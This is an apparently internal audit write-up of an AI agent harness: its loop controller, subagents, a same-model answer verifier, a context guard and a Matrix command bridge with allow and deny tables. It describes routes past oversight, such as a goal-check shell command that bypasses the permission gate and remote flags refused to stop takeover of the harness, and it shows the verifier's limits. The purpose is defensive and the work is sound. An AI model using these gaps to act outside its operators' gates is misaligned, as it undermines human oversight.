   4. what a host function's answer CAN say  AA2, AB1, AB3
   5. WHEN it can say it, and how long the   AB1–AB4
      answer stays true
   6. WHO RECEIVES IT, and what they see     AC1–AC5
      when nobody does
   7. WHO OBEYS IT — and does the code that  AD1–AD7  ← this pass
      obeys ever see the instruction, and
      what else does obeying it do?
```

Surface 7 has two halves and the findings split evenly between them:

```
   "does the obeyer see it?"        AD1  resolved, injected, discarded
                                    AD2  a precondition in front of the mechanism
                                    AD5  not recognised as an instruction at all
                                    AD6  reaches a mechanism the gate cannot watch
                                    AD7  a second handle on a refused door

   "what else does obeying it do?"  AD3  it aborts the turn in flight
                                    AD4  it writes a receipt for an outcome that
                                         does not exist yet
```

---

## 3. The loop (`vendor/pi-loop-mode`)

Thirteen handlers, one module-global `LoopState`, one `/loop` command, one `loop`
tool, 2,981 lines. Its whole job is deciding what a turn's outcome *was* and then
getting one sentence to the model about it.

### 3.1 The thirteen handlers, and which entry point each one sees

`before_agent_start` is the one row that is not "every time the thing happens",
and that is AA1:

```
  handler                  fires on                       unattended run?
  ──────────────────────────────────────────────────────────────────────────
  session_before_compact   pi is about to compact          yes
  session_compact          pi compacted                    yes
  session_start            session opens / restarts        yes  [X4]
  session_shutdown         session closes                  yes  [X4]
  agent_settled            a whole prompt finished         yes
  before_agent_start       AgentSession.prompt() ONLY      **NO**   ← AA1
  before_provider_request  every provider call             yes  [S4]
  context                  every provider call             yes  [Z3]
  message_start            each assistant message          yes
  message_update           each delta                      yes
  tool_result              each tool result                yes
  message_end              each assistant message          yes  [X1 X2 X3 Z3]
  agent_end                each agent RUN                  yes  ← THE LADDER
  ──────────────────────────────────────────────────────────────────────────
```

### 3.2 `agent_end` — the ladder

Twenty-one `return;` statements and a fall-through. Every arrow leaving the column
is a `return`. This is the single most important diagram in the loop, because
every counter in `LoopState` is charged or cleared somewhere on it.

```
 agent_end(event, ctx)
   ├─ !state.active → (preparing? read GOAL_READY from the turn's ANSWER) ──▶ ✗
   ├─ clearPendingTimer() · token := runToken
   ├─ drain the three per-turn buffers into locals, then resetTurnBuffers()
   ├─ age penaltyTurnsRemaining        ← every exit ages it, not just the last
   ├─ read+clear degenerateAbortPending into a local
   ├─ softStopRequested ──────────────────────────────────────────────────▶ ✗
   ├─ isContextPressure(...) ─────────────────────────────────────────────▶ ✗
   │     lowOutputLength · saturatedLength · contextLikeError ·
   │     explicitOverflow · starvedTurn (empty answer at >= 87%)
   ├─ !lastAssistant || stopReason === "error" ─▶ providerErrorStreak++ ───▶ ✗
   │     …and at MAX_PROVIDER_ERRORS (10) ─▶ pauseForProviderFailure
   ├─ aborted && degenerateAbortThisTurn ─▶ interveneStuck ────────────────▶ ✗
   ├─ aborted ─▶ status "paused", "Turn aborted by operator"  ← AD3's damage ✗
   │  ─── the success path ───
   ├─ every ladder counter reset · iterationCount++ · turnsWithoutTools
   ├─ committedText := commitTurnMemory(texts, calls, answers)
   ├─ rescueActive ─▶ switch back to the loop model ───────────────────────▶ ✗
   ├─ stuckReason := detectStuck(committedText, turnEmittedTexts)
   ├─ checkCommand → runGoalCheck → applyCheckOutcome         ← AB1 AC3 AD6
   │     ├─ execFailed × 3 ─▶ pauseForCheckFailure ────────────────────────▶ ✗
   │     └─ untilDone && passed && !execFailed ────────────────────────────▶ ✗
   ├─ /LOOP_DONE:/                                            ← AC2
   │     guarded by (lastCheckPassed !== true || checkErrorStreak > 0) ────▶ ✗
   ├─ /LOOP_BLOCKED:/ ────────────────────────────────────────────────────▶ ✗
   ├─ maxIterations · scoreRegressed · stuckReason · the 8-iteration nudge ▶ ✗
   └─ normal continue: scheduleLoopTurn
```

Note the `aborted` rung. It is correct — an operator's Esc must pause the run and
keep the state for `/loop resume` — and it is the rung AD3 walks into, because
pi's `compact()` produces exactly the same `stopReason` from a completely
different cause, and nothing downstream can tell them apart.

### 3.3 The goal check, in full, because AD6 is here and AC3 is one line above it

This is the only mechanism in the loop that consults something outside the model,
and the only place in the whole stack where a shell command runs without passing
a `tool_call`.

```
   agent_end, success path
     │
     └─ state.checkCommand?
          │
          ├─ runGoalCheck(pi)
          │    pi.exec("bash", ["-lc", wrapCheckCommand(cmd)],
          │            { timeout: checkTimeoutSeconds * 1000 })
          │      │        ▲ NOT a tool call. No `tool_call` event, so:
          │      │            · prinny's permission relay never sees it   AD6
          │      │            · rtk-pi's rewrite gate never sees it
          │      │            · compaction-guard's output cap never sees it
          │      │          The identical string, sent to the model as prose,
          │      │          becomes a `bash` TOOL call and passes all three.
          │      │
          │      │   pi's execCommand — no `reject` ANYWHERE in the body
          │      │   ────────────────────────────────────────────────────
          │      │   spawn error   → waitForChildProcess rejects → .catch
          │      │                   → resolve({ code: 1, killed })
          │      │   timeout       → killProcess() → SIGTERM → exit(null)
          │      │                   → resolve({ code: null ?? 0, killed:TRUE })
          │      │   any exit      → resolve({ code: code ?? 0, killed })
          │      │        ▲                              ▲
          │      │        │                              └─ a SIGNALLED child
          │      │        │                                 has NO code. The
          │      │        │                                 death is discarded
          │      │        │                                 here.        [AB1]
          │      │        └─ set ONLY inside killProcess(), whose two callers
          │      │           are options.timeout and options.signal. It means
          │      │           "pi killed this", not "this was killed".   [AB1]
          │      ▼
          │    wrapCheckCommand(cmd) =
          │        trap 'printf "\n<MARKER>:%d\n" "$?"' EXIT
          │        (
          │        <the operator's command>
          │        )
          │        ▲ the SUBSHELL is AC3. A bash EXIT trap is a slot, not a
          │          stack: a `trap … EXIT` inside the command REPLACES ours,
          │          and `exec` discards it. Inside `( … )` neither can reach
          │          the shell that prints the marker, and the exit status
          │          still propagates.
          │      ▼
          │    ┌─ result.killed              ─▶ execFailed  "did not finish
          │    │                                 within Ns and was killed"
          │    ├─ !readCheckCompletion(out).completed
          │    │                            ─▶ execFailed  "died before it
          │    │                                 finished — killed by a signal"
          │    └─ else  ─▶ passed = (result.code === 0), score from /SCORE: n/
          │
          ├─ applyCheckOutcome(state, outcome)
          │     execFailed → checkErrorStreak++ , lastCheckError,
          │                  and the check state is LEFT AT ITS LAST REAL VALUE
          │                  ("passing — LAST KNOWN", which is the honest read)
          │     else       → lastCheckPassed · checkFailStreak · score · best
          │
          ├─ execFailed && streak >= MAX_CHECK_ERRORS (3) ─▶ pauseForCheckFailure
          └─ untilDone && passed && !execFailed          ─▶ COMPLETED
```

The five sentences the mechanism can produce:

| what happened | `killed` | marker | verdict | what the operator is told |
| --- | --- | --- | --- | --- |
| exited 0 | false | present | passed | `Check status: passing` |
| exited non-zero | false | present | failed | `failing (streak N)` + the output, given to the model |
| pi's timeout | **true** | present | could-not-run | `did not finish within Ns and was killed` |
| SIGKILL / OOM | false | **absent** | could-not-run | `died before it finished — killed by a signal` |
| its own EXIT trap, or `exec` | false | present *(since AC3)* | its real answer | as if nothing had happened |
| SIGTERM from outside | false | present | *failed or passed* | **still not distinguishable — §11.4** |

### 3.4 `detectStuck` — eight rules

```
   #  rule                                    reads                    fixed by
   ──────────────────────────────────────────────────────────────────────────────
   1  detectDegenerateRepetition(t, 4)        EVERY message of the     [X2][X5]
      sentence / word / phrase                turn, ORIGINAL text      [Z3]
   2  turnsWithoutTools >= 3                  a counter                    T2 [X4]
   3  last two fingerprints equal             committedText            V2  [X1]
   4  last three fingerprints equal           committedText            V2  [X1]
   5  textSimilarity >= 0.80                  committedText, cut       V2 W2 [X1]
   6  same fingerprint >= 3 in the 8-window   the window, GATED on     V2  [X1]
                                              this turn's text          (10th)
   7  last three TURN tool signatures equal   recentToolResults,       U2, 10th
                                              markers stripped
   8  same question repeated (ends in "?")    committedText+snippets   V2  [X1]
   ──────────────────────────────────────────────────────────────────────────────
```

### 3.5 The escalation ladder and the context ladder

```
  interveneStuck(reason)
    consecutiveStuckCount++ · interventionCount++ · turnsWithoutTools := 0
    penaltyTurnsRemaining := 3   → before_provider_request rewrites the payload
                                   (frequency 0.5, presence 0.5, temp +0.2)
      ├─ rescue    !saturated && rescueModel && streak >= 3
      │            switchModel(pi, ctx, state.rescueModel)      ← AD7's target
      ├─ compact   saturated || (streak >= 5 && >= 5 iterations since the last)
      │            ctx.compact({onComplete, onError})  ← both passed
      └─ strategy  delay = min(60, 2 ** min(streak, 6)) seconds, rotating
                   STUCK_STRATEGIES[interventionCount % 5]

  context ladder
    1. TELL      the `context` handler, >= 60% advisory, >= 80% CRITICAL
    2. BOUND IN  compaction-guard's tool_result cap                  §6
    3. DETECT    agent_end → isContextPressure()
    4. RECOVER   deferred to agent_settled (pi's own overflow recovery wins the
                 race otherwise): 2 emergency compactions, then 3 cooldowns
                 (60/120/240 s), then pauseForContextFailure
    5. BOUND OUT compaction-guard's summary cap                      §6
```

The measurement the whole thing rests on: **below 87% of the window, 3 empty
assistant turns out of 196; at or above 87%, 33 out of 63.** A cliff, not a
gradient — and an empty turn still costs a full iteration.

### 3.6 The four ways a run restarts

```
                          /loop start   /loop run    /loop resume   session_start
                          (applyGoal-   (runLoop)    (the resume    auto-resume
                           Config)                    branch)       (a restart)
   ───────────────────────────────────────────────────────────────────────────────
   description/criteria    REPLACED     kept         kept           kept
   iterationCount          0            0            kept           kept
   the 3 repetition        cleared      cleared      KEPT           kept
     windows
   consecutiveStuckCount   0            0            0              kept
   consecutiveErrorCount   0            0            0              kept
   providerErrorStreak     0            0            0        ←U    kept
   penaltyTurnsRemaining   0            0            0        ←U    kept
   contextCooldownCount    0            0            KEPT           kept
   ───────────────────────────────────────────────────────────────────────────────
   lastCheckPassed         undefined    undefined ←V KEPT     ←AC2   kept
   lastCheckScore/best     undefined    undefined ←V KEPT           kept
   checkFailStreak         0            0         ←V KEPT           kept
   checkErrorStreak        0            0         ←V 0        ←AC2   kept
   lastCheckError          ""           ""        ←V ""       ←AC2   kept
   ───────────────────────────────────────────────────────────────────────────────
     ←V  added by V3 (sixth pass)      ←U  added by the eighth pass
     ←AC2 the twelfth pass
```

The rule the table makes visible: **`resume` may keep anything that describes the
run, and must not keep anything that describes a decision the run has already
acted on.**

The control-ledger reading of the same table is one line longer: **`checkCommand`
is kept by all four**, so a `--check` set once is a shell command the machine goes
on running until somebody replaces it. That is the property AD6 is about.

---

## 4. Subagents (`vendor/pi-subagents-lite`)

64 source files. Three tools (`Agent`, `StopAgent`, `AgentStatus`), a widget, an
`/agents` menu, a slot table, a watchdog, a spawn coordinator that owns delivery.

### 4.1 A record's life, with the control points marked

```
  tool_call        toolCallListener writes model + thinking onto the ARGS   ▸
    │              (the same object execute() receives — pi passes one)
    ▼
  executeAgentTool worktree · type · maxTurns · thinking · MODEL   ← AD1
    │
    ▼
  spawn()          status queued|running · gate created · brief := prompt
    │              parent signal: `.aborted` tested FIRST, then a listener  ✔
    ▼
  startAgent()     slot reserved · watchdog started · started := true
    │              record.execution.abortController created
    ▼
  runAgent()       build window (AB4) → runSessionPrompt → runTurnLoop
    │                model := options.model ?? frontmatter ?? ctx.model
    │                forwardAbortSignal(session, signal)
    │                if (signal.aborted) throw ABORTED_BEFORE_START   ← AB4
    ▼
  .then            status ← classifyRun(result)   TERMINAL FROM HERE
    │              …unless it is already "stopped", which is preserved
    │              result := responseText                            ← Z1
    │              runVerification()   ← the record's SECOND run
    │                 ▲ status says "completed" for all of it.  ← AD2
    ▼
  .finally         settlementCount++ · outputLog finalised · slot released
                   tallyCompletion ──▶ notifyComplete ──▶ onComplete
                   │                                        │
                   │                                        ▼
                   │                     SpawnCoordinator.onAgentComplete
                   │                       background first settlement? nudge
                   │                       settlementCount >= 2?        nudge
                   │                         └─▶ scheduleNudge (200 ms batch)
                   │                               └─▶ emitIndividualNudge  AC1
                   drainQueue · gate opened · settled := true
                                  │
                                  ▼
                    the FOREGROUND Agent tool call unblocks here
```

The **completion gate** is the invariant worth knowing: every record carries a
promise from birth, opened exactly once, never assigned the run's own promise.
Seven paths open it, so a foreground `Agent` call can never hang on a record that
will not settle.

### 4.2 The turn ceiling, and what a stop can actually reach

```
   normalizeMaxTurns(n): 0 → unbounded · absent → 40 · else max(1, n)

   turn_end, turnCount++
        ├── maxTurns == null ─────────────────────────────▶ nothing, ever
        ├── !ceilingReached && turnCount >= maxTurns
        │      graceTurns <= 0 → abort   ·  > 0 → wrap-up steer      V6 W4 T1
        │      …and NEITHER for maxTurns === 1, which reaches its ceiling by
        │      FINISHING — `shouldSteerAtSoftLimit(1)` is false, and
        │      `turnLimited` follows the steer rather than the ceiling
        └── ceilingReached && turnCount >= maxTurns + graceTurns → abort

   stopAgent(record)                      who can reach it
        verifying?  → verifyAbort.abort()     Esc ✔ · /agents ✔ · StopAgent ✘ AD2
        queued?     → spliced out of queue    all three ✔
        running?    → abortController.abort() all three ✔
        else        → false
```

The `stopAgent` half of that table has been right since the eleventh pass. The
*"who can reach it"* column is the thing this pass added, and it is the whole of
AD2: a fix at a mechanism is not a fix at its callers.

### 4.3 What a child inherits, in full

```
   the PARENT is started with seven -e flags. A CHILD inherits NONE of them.

   ┌───────────────────────────────────────────────────────────────────────────┐
   │  the child's DefaultResourceLoader                                        │
   │   route A — DISCOVERY               route B — additionalExtensionPaths    │
   │   ~/.pi/agent/extensions/**         subagentExtraExtensionPaths():        │
   │   <cwd>/.pi/extensions/**             vendor/rtk-pi/extensions/index.ts   │
   │     compaction-guard  ✓ wanted        (or $SUBAGENT_EXTRA_EXTENSIONS)     │
   │     browser-guard     – harmless      suppressed when the agent declares  │
   │     stack           ✗ guards itself   `extensions: false`                 │
   │   ── withExtensionDenial() runs LAST over BOTH ──────────────────────     │
   │      any path segment matching (?:[a-z0-9._@-]*-)?prinny-channel/ is cut  │
   └───────────────────────────────────────────────────────────────────────────┘

   pi-loop-mode reaches a child by neither route, three times over:
     · not discovered (it lives in vendor/)
     · removed from route B, because its state is module-global
     · its factory returns early when __PI_SUBAGENT_SPAWN_DEPTH__ > 0

   rtk-pi DOES reach a child, deliberately — a child's bash output rents the
   same 32k window — and that is why its factory's `pi.exec("rtk","--version")`
   runs once per spawn, inside the build window AB4 is about.
```

### 4.4 The concurrency slot, and why it is 1

```
   SlotTable
     precedence: models[key] → providers[provider] → default
     `running` is a FACT; `limit` is CONFIGURATION. setLimits() rebuilds the
     counts from the holders, because deleting a stale auto-created slot used
     to take the in-flight agent's count with it — two children against
     PARALLEL_SLOTS=1.

   the default is 1, and the reason is measured rather than assumed:
     a subagent having its OWN system prompt does NOT by itself evict the
     parent's cached prefix (99.2% hit across six small child turns).
     What evicts it is SIZE — a child that grew to 18k tokens took the
     parent's next call from 2,117 cached tokens to zero, 442 ms → 2,949 ms.

   the key a slot is looked up by is `${model.provider}/${model.id}` —
   which is why AD1 also collapsed per-model slots onto one: every child
   was keyed on the parent's model.
```

---

## 5. The verifier

### 5.1 Three layers, cheapest first

```
   1. ANCHOR      no model call. After a compaction, restate the brief into the
                  child's freshly-summarised context. Prevention, not detection.
                  Fires only where it rides a turn that was already coming — Z2.

   2. STRUCTURAL  no model call. structuralVerdict(answer, lifecycle):
      GATE          "" → skipped-empty, and the note REPLACES the answer
                    status error → skipped-error   (the text is never shown)
                    aborted / turn_limited / stopped → skipped-cutoff
                  This is most of what actually goes wrong, and it is free.

   3. JUDGE       one model call, in a fresh __verifier session — no tools, no
                  extensions, no skills, one turn — shown only the brief and the
                  answer. It is harder to fool because it knows less.
                    │
                    ├─ ADDRESSED, attempts 0        → the answer, undecorated
                    ├─ ADDRESSED, attempts > 0      → + "repaired" note
                    ├─ unparsed                     → + "unparsed" note (a PASS)
                    └─ NOT_ADDRESSED
                          attempts >= rounds        → ORIGINAL + "failed" note
                          else → REPAIR (the CHILD's own session, 1 turn)
                                   empty / cut off  → ORIGINAL + "failed"
                                   identical        → ORIGINAL + "stalled"
                                   else             → judge it again
```

### 5.2 The two asymmetries, and both are the design

```
   judge   knows LESS than the child — no transcript, no tools, no history.
           A model handed its own reasoning ratifies it; the judge cannot.
   repair  knows MORE — it continues the child's own session, because that is
           the only place with the context to actually fix the answer.

   unparsed counts as ADDRESSED. A judge that answered in a shape nobody asked
   for is evidence about the JUDGE, not about the answer, and failing a good
   result because a 27B was chatty would make the layer worse than nothing.
   The flag is kept so the note can say so.
```

### 5.3 What the verifier delivers, and to whom

It has **no carrier of its own**. It rewrites `record.result` in place, so it
inherits the failure mode of whichever carrier is taking the answer home — the
`Agent` tool result for a foreground child, `pi.sendMessage` for a background
one. That is why AC1 cost the verifier's whole output for two passes without the
verifier being involved in the defect at all.

Its control surface, on the other hand, is entirely its own, and all three
switches are read at the same moment:

```
   SUBAGENT_VERIFY=0          skip entirely
   SUBAGENT_VERIFY_ROUNDS     repairs allowed, clamped [0,3], default 1
   SUBAGENT_VERIFY_TIMEOUT_MS one call's deadline, clamped [10s,1h], default 5m

   all three read in runVerification(), when the child SETTLES.
   two of them used to be read there and one when the child STARTED — so an
   operator turning verification off during a long delegation still got one.
```

### 5.4 What it cannot do

The judge is the same 27B that wrote the answer. It catches a different question
being answered, an empty or evasive summary, and a claim about work that was
plainly not done. It does not catch subtly wrong work. Calling it verification in
the stronger sense would be a lie the parent would act on.

---

## 6. `compaction-guard`

Three handlers, no tools, no commands, and the only extension a child inherits on
purpose.

```
  1. session_before_compact   cap the summary pi carries forward
       preparation.previousSummary is MUTATED IN PLACE (checked against pi:
       emit() passes the event by reference with no structuredClone, and
       agent-session.js then calls compact(preparation, …) with that object)
       returns undefined always — pi keeps ownership of the compaction
       ⚠ LAST TRUTHY WINS on this event: when pi-loop-mode returns a
         {compaction}, pi never reads previousSummary at all. The notice says
         what was DONE, not what pi will do with it.

  2. tool_result              cap ONE tool result against what context is LEFT
       allowance = f(window - tokens), floor 1,500, ceiling 20,000
       overflow spilled to a file the marker names; 50 files kept
       text blocks collapse into one; image blocks are left alone
       ← this is what bounds a FOREGROUND subagent's answer, for free,
         because it keys off toolName rather than a list of pi's builtins

  3. context                  show the model its own budget above 60%
       stands down when a `-context-budget` message is already present, so a
       loop session is not told twice
```

The measurement it exists for: the carried-over summary grew 456 → 4,029 →
11,054 chars across 42 real compactions, monotonically, because pi's own update
prompt says PRESERVE. And on 2026-08-17 the CRITICAL notice was in context at
84.5% — "do not run commands with large output this turn" — and the model ran a
curl loop that returned 17,790 characters, taking the window to 100%. Telling it
does not stop it, which is why cap 2 exists.

---

## 7. `prinny-channel`

Seven handlers, a `/prinny` command, a `prinny` tool, and a sidecar child process
speaking MCP over stdio. The only path in the stack with a **second human** on it,
and therefore the only place where "who is allowed to instruct this machine" is a
question at all.

### 7.1 What happens to a message with a leading slash — the whole decision

```
   body
    ├ not a string                                   → text
    ├ does not start with "/"                        → text
    ├ contains a newline                             → text
    │   (a command is one line; anything else is prose that opens with a slash)
    ├ /^\/([a-zA-Z][\w-]*)\s*(.*)$/ does not match   → text
    ├ name ∉ KNOWN_COMMANDS                          → text        ← AD5 was here
    ├ name ∈ MATRIX_LOCAL                            → local
    │   the one entry is `compact`; this file performs it
    ├ name ∉ MATRIX_ALLOWED                          → refuse
    ├ rest contains a REFUSED_FLAG                   → refuse      ← AD6, AD7
    │   --model · --rescue-model · --check
    ├ MATRIX_ALLOWED[name] === null                  → run  (whole command)
    └ first arg ∈ MATRIX_ALLOWED[name]               → run  (else refuse)
```

The asymmetry that shapes the table, stated in the file itself: *forgetting to
allow something costs a message saying "run that in the terminal"; forgetting to
deny something hands an allowlisted Matrix account the harness.* AD5 is the first
half happening by accident; AD6 and AD7 are the second half.

### 7.2 The three tables, and what each one promises

```
   KNOWN_COMMANDS   "this is a command, not prose."  Everything this stack
                    registers, plus every pi built-in worth refusing by name.
                    Being IN it and in neither table below means REFUSED.

   MATRIX_ALLOWED   "pi will do this."  An entry is a promise pi keeps —
                    `_tryExecuteExtensionCommand` can dispatch it.
                    { stack: null, loop: null }

   MATRIX_LOCAL     "this file will do this."  An entry is a promise THIS
                    extension keeps, for commands pi cannot dispatch.
                    { compact: "compact the conversation context" }
```

AC5's fix was moving `compact` from the first table to the third. AD5 is a
command in none of them; AD6/AD7 are arguments to an entry in the second.

### 7.3 The undelivered sweep

```
   an entry is REPORTED as undelivered when, and only when:
     · the session is IDLE                 (agentRunning === false)
     · and `answered` is false             ← AC4: was it ever pi's to take?
     · and `live` is false                 ← AB2: did pi echo it back?
     · and `undeliveredReported` is false
     · and it is older than DELIVERY_GRACE_MS (60 s)

   idleness is the load-bearing half, not the clock: a message delivered while
   pi is streaming drains inside that same run. The clock covers the one thing
   idleness cannot — prompt() awaits _checkCompaction BEFORE it starts a run.
```

`answered` is set on three branches — `refuse`, `local` and `run` — and the third
is the one AD4 is about: it *did* hand the message to pi, so the flag is
suppressing a report that could in principle have been right. It stays, because a
dispatched extension command produces no user message and `markLive` can never
fire for it either; what changed is the sentence the sender gets.

### 7.4 The typing indicator, and why 8 seconds

Matrix expires a typing indicator at 20 s. A 27B thinks for longer than that
between visible tokens, so the indicator is refreshed every 8 s while
`agentRunning` — and cleared in `agent_settled` *before* the answer is forwarded,
because a bot still "typing" next to a finished reply reads as though more is
coming.

---

## 8. `rtk-pi`

One handler, no tools, no commands, 108 lines of coupling over a pure gate.

```
   factory        pi.exec("rtk", ["--version"])  ← runs on EVERY spawn (AB3)
                    killed?  → warn and return       ← a wedged rtk looks
                    code≠0?  → warn and return         exactly like a healthy
                    < 0.23   → warn and return         one that printed nothing
   tool_call      bash only
                    RTK_DISABLED=1 → pass through   ← checked before the gate
                    !shouldFilter(cmd) → pass through
                    rtk rewrite cmd → event.input.command = rewritten
```

The allow-list is 23 commands and **every entry is a measurement**. Upstream's
version delegates every bash command; this one refuses to, because some rewrites
change what the command MEANS — `npm run lint` → `rtk lint` runs a bare eslint
instead of the package's lint script, and `uv run pytest` → `uv run rtk pytest`
resolves a different pytest. A 27B at 32k has no way to notice either.

---

## 9. Findings

Every finding below is PROVEN by an execution unless it says otherwise, fixed,
and carries a regression test that fails when the fix is removed.

### AD1 — the model override that four readers reported and nobody applied · **HIGH** · PROVEN · **FIXED**

**What it was.** `pi-subagents-lite` has a six-level model precedence, resolved
by `ConfigStore.modelFor()` → `resolveModel()`:

```
   session per-type  →  session default  →  config per-type  →
   config default    →  the agent .md's frontmatter `model:`  →  the parent's model
```

Four components read it. `toolCallListener` computes it and writes the answer
onto the tool call's arguments as `input.model`, plus a display copy as
`input._modelOverride`. `renderAgentToolCall` prints that copy next to the call —
`▸ Explore (qwen3-4b)`. `menu-spawn-wizard` resolves it and passes the resulting
`model` and `modelKey` into the spawn. `menu-model-settings` lists it, per type,
under "effective model".

The fifth component runs the spawn, and the twelfth pass changed its line to:

```js
   const model = findModelInRegistry(undefined, ctx.modelRegistry, ctx.model);
```

with a comment explaining that the tool's schema is `additionalProperties: false`
over five keys, so "the model cannot send either key and these reads were always
undefined".

**Why the reasoning failed.** It is a true statement about the *model*, and the
model is not the sender. `toolCallListener` is a `tool_call` handler; pi hands the
**same object** to the handler and to the tool:

```
   pi-agent-core/dist/agent-loop.js
     :403  const validatedArgs = validateToolArguments(tool, preparedToolCall);
     :406  await config.beforeToolCall({ …, args: validatedArgs, … });
     :452  await prepared.tool.execute(prepared.toolCall.id, prepared.args, …);
```

So `input.model = …` in the handler *is* `params.model` in the tool. The proof is
already in the file: three lines below the changed line,
`parseThinkingLevel(params.thinking as string | undefined)` reads `thinking`,
written by the same handler onto the same object, and it works.

**Blast radius.** Every layer of the precedence above the parent's own model, on
every spawn started by the model — which is every spawn except the `/agents`
wizard's. Including the agent `.md` frontmatter, because `agent-runner.ts`'s own
fallback is `options.model ?? findModelInRegistry(agentConfig?.model, …)` and the
tool always supplied the left side. And the concurrency key with it: `modelKey`
is derived from the same resolved model, so every child was keyed on the parent's
slot rather than its own.

**Why nothing failed.** The test the twelfth pass wrote to pin the removal:

```js
   assert.doesNotMatch(execution, /params\.model\b/);
```

A source pin over a premise. It made the wrong behaviour the *protected* one — so
the first thing that happened when this pass fixed the line was that the suite
went red, which is exactly backwards from what a regression test is for.

**Measured.** `context/testing/probes/q1-the-model-override-nobody-applies.mjs`,
through pi's own bundled jiti:

```
                                                BEFORE                NOW
   the model the child runs on             : forge/qwen3.8-27b     forge/qwen3-4b
   the key its concurrency slot is keyed on: forge/qwen3.8-27b     forge/qwen3-4b

   renderAgentToolCall(input)              : ▸ Explore (qwen3-4b)     ← both columns
```

**The fix.** Read `params.model`, with the reasoning above written at the line.
The `max_turns` half of the twelfth pass's change stands: that key really is only
ever model-supplied, and the schema really does forbid it.

**The test.** `tests/tool-surface.test.ts` now pins the reads AND the listener
that writes them, so the pair cannot drift apart — and the probe executes it.

---

### AD2 — the stop the tool could not reach · **MEDIUM** · PROVEN · **FIXED**

**What it was.** T5 (closed in the eleventh pass) made a record whose verifier is
still running stoppable: `AgentManager.stopAgent()` tests `isVerifyingRecord`
*before* it tests `status === "running"`, and aborts `execution.verifyAbort`,
which routes through `verifyAnswer`'s catch — the child's answer goes back
annotated as unchecked, the phase clears, the gate opens. The comment above that
branch says the fix is for "the operator's Esc, for `StopAgent`, and for anything
else that asked".

`executeStopAgentTool` never asked. It had its own precondition:

```js
   if (record.lifecycle.status !== "running" && record.lifecycle.status !== "queued") {
     return successResult(`Agent ${agentId} is already ${record.lifecycle.status}. …`);
   }
```

and `attachSettlementChain` sets the status from `classifyRun` *before* it awaits
`runVerification`, so for the whole of a judge and up to three repairs the record
reads `completed`.

**What the model saw.**

```
   StopAgent → "Agent agent-0123456789ab is already completed. Running agents: none"
```

Both halves wrong at once: the agent is not finished — a judge is holding the one
llama slot the model's own next call is queued behind, and the answer it is
waiting for has not been decided — and the "Running agents" hint omits it, because
`formatRunningAgents()` filtered on the same two statuses.

**Measured.** `context/testing/probes/q2-the-stop-the-tool-cannot-reach.mjs`. The
control in the same probe is the `/agents` menu, which calls `manager.abort()`
directly and has worked since the eleventh pass.

**The fix.** Both call sites now ask `isBusyRecord` — the predicate
`record-activity.ts` exists to be the single answer to this question, and which
the widget and the `/agents` menu were already using. The sentence names which run
was stopped, for the same reason the menu's label does:

```
   NOW → "Stopped the answer check on agent agent-01. Its own run had already
          finished; the answer goes back unchecked."
```

`clear()` still refuses a verifying record. That is Y1 and it is unchanged: a
stop is a thing you can do to work in flight, a clear disposes the session the
work is running in.

---

### AD3 — the compaction that cancelled somebody else's turn · **HIGH** · PROVEN · **FIXED**

**What it was.** AC5 (twelfth pass) made `/compact` from Matrix real. Before it,
the command was inert — pi's `prompt()` dispatches extension commands only, so the
literal text reached the model — and the fix routed it to
`ExtensionContext.compact({onComplete, onError})`, answering the sender from the
callbacks rather than from the call. All of that is right.

What the call *does* was not asked. pi's implementation:

```js
   async compact(customInstructions) {
       await this.abort();                      // agent-session.js:1367
       this._compactionAbortController = new AbortController();
       this._emit({ type: "compaction_start", reason: "manual" });
```

So the first thing a remote `/compact` did was cancel whatever the session was
doing — from a phone, with the command advertised in the client's own `/` menu, in
an extension whose every other inbound path is built specifically not to do that:
inbound text is delivered `deliverAs: "followUp"` by default, under a comment
reading *"a message arriving mid-turn joins the queue rather than interrupting
work the user asked for in the terminal."*

**Why it is worse than a lost turn.** `vendor/pi-loop-mode`'s `agent_end` ladder
has a rung for an aborted turn, and it is correct — an operator's Esc must pause
the run and keep the state for `/loop resume`. It cannot tell an Esc from a
compaction, because both arrive as `stopReason: "aborted"`. Driving the shipped
loop module directly:

```
   an ordinary iteration, then:      Status: running · Iterations: 1/∞
   … the turn is aborted …
   the loop's notice   : Loop paused (turn aborted). Use /loop resume to continue.
   Status: paused
   Last notice: Turn aborted by operator. Use /loop resume to continue.
```

An unattended run, stopped by a remote message, and recorded against somebody who
was not there.

**Measured.** `context/testing/probes/q3-the-compact-that-aborts-someone-elses-turn.mjs`
— pi's `compact()` pinned where it is written, `planCompaction` executed in both
columns, and the loop's pause driven through the real module. Its control is the
same run without the abort.

**The fix.** `src/compaction-request.ts` — a pure `planCompaction({hasSession,
agentRunning})` returning `now` / `defer` / `unavailable`, each with the sentence
the sender gets. A request that lands mid-turn is held in `pendingCompaction` and
drained in `agent_settled`, after `forwardResult()` — by then aborting costs
nothing, because the run is over, and the sender's answer is not queued behind a
summariser call on the one slot.

Deferred rather than refused: the sender asked for something reasonable, and
usually asked because the bot had gone slow. "No" is the wrong answer when "in a
moment" is available.

The rule lives in `src/` and not in the handler for the reason `delivery.ts`,
`record-activity.ts` and `concurrency-slots.ts` all exist: `extensions/index.ts`
imports pi and the suite cannot load it, so a rule written there could only ever
be pinned as text.

---

### AD4 — a receipt written before the outcome existed · **MEDIUM** · PROVEN·SOURCE · **FIXED**

**What it was.** AC5's own sentence, in the twelfth pass's write-up:

> "Ran `X`" was sent on the strength of having CALLED the function, not of
> anything having happened.

AC5 fixed that for `/compact`, the one command pi cannot dispatch. For the ones it
can, the same sentence was still being sent — and pi makes it worse than a
guess. `_tryExecuteExtensionCommand` wraps the handler:

```js
   try { await command.handler(args, ctx); return true; }
   catch (err) {
     this._extensionRunner.emitError({ extensionPath: `command:${commandName}`, … });
     return true;                                       // ← handled
   }
```

`return true` in the catch means `prompt()` **resolves** on a command that threw,
and `emitError` fans out to `runner.errorListeners`, which is empty outside a TUI
(AB2, unchanged). So a `/loop start` from Matrix whose handler failed produced:
the sender told "Ran `/loop start …`", no loop running, no error anywhere a
person can see — and, since AC4, no undelivered sweep either, because the same
branch sets `answered = true`.

**The residue, stated rather than fixed.** There is no observable to condition
on. A dispatched extension command produces no user message, so `markLive` can
never fire for it, and `sendUserMessage` returns `void`. The sweep genuinely
cannot tell a successful command from a failed one, so `answered` stays.

**The fix is the claim.** The sentence now says what this extension did, which it
knows, instead of what pi did, which it does not:

```
   BEFORE  Ran `/loop status`. Its output stays in the terminal.
   NOW     Handed `/loop status` to the session. Its output stays in the
           terminal — I cannot see whether it succeeded, so check with the
           operator if it matters.
```

**Measured.** `context/testing/probes/q4-…`, which pins pi's dispatch catch and
